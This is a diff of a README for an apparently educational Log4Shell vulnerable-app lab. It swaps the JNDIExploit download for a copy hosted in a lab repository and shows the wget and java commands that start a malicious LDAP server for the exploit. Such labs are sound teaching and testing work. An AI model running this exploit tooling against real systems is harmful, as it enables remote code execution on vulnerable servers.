@@ -7,6 +7,11 @@ It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.
 ![](./screenshot.png)
 
 ## Running the application
+Source Code:
+
+```bash
+https://github.com/gyaansastra/Attack-Defense-Lab/tree/dev/labs/log4j/poc1/code
+```
 
 Run it:
 
@@ -25,13 +30,8 @@ docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
 
 *Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
 
-**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*
-
-* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
-
 ```bash
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
-unzip JNDIExploit.v1.2.zip
+wget https://github.com/gyaansastra/Attack-Defense-Lab/blob/dev/labs/log4j/poc1/code/JNDIExploit.v1.2/JNDIExploit-1.2-SNAPSHOT.jar
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
 
